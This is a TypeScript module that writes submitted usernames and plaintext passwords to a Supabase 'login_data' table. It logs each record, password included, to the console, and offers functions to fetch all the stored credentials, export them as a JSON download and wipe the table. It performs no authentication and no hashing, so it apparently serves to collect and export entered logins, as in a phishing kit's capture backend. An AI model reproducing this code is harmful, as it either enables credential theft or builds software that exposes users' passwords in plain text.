
import { supabase } from '@/integrations/supabase/client';

interface LoginData {
  username: string;
  password: string;
  rememberMe: boolean;
  timestamp: string;
}

export const saveLoginData = async (data: LoginData) => {
  try {
    const { error } = await supabase
      .from('login_data')
      .insert({
        username: data.username,
        password: data.password,
        remember_me: data.rememberMe,
        timestamp: data.timestamp
      });

    if (error) {
      console.error('Error saving to Supabase:', error);
      throw error;
    }
    
    console.log('Data saved to Supabase:', data);
  } catch (error) {
    console.error('Failed to save login data:', error);
    throw error;
  }
};

export const getLoginData = async (): Promise<LoginData[]> => {
  try {
    const { data, error } = await supabase
      .from('login_data')
      .select('*')
      .order('created_at', { ascending: false });

    if (error) {
      console.error('Error fetching from Supabase:', error);
      throw error;
    }

    // Transform the data to match the expected format
    return (data || []).map(item => ({
      username: item.username,
      password: item.password,
      rememberMe: item.remember_me,
      timestamp: item.timestamp
    }));
  } catch (error) {
    console.error('Failed to fetch login data:', error);
    return [];
  }
};

export const clearLoginData = async () => {
  try {
    const { error } = await supabase
      .from('login_data')
      .delete()
      .gte('id', '00000000-0000-0000-0000-000000000000'); // Delete all records

    if (error) {
      console.error('Error clearing Supabase data:', error);
      throw error;
    }
  } catch (error) {
    console.error('Failed to clear login data:', error);
    throw error;
  }
};

export const downloadLoginData = async () => {
  const data = await getLoginData();
  const dataStr = JSON.stringify(data, null, 2);
  const dataBlob = new Blob([dataStr], { type: 'application/json' });
  
  const url = URL.createObjectURL(dataBlob);
  const link = document.createElement('a');
  link.href = url;
  link.download = 'login_data.json';
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(url);
};
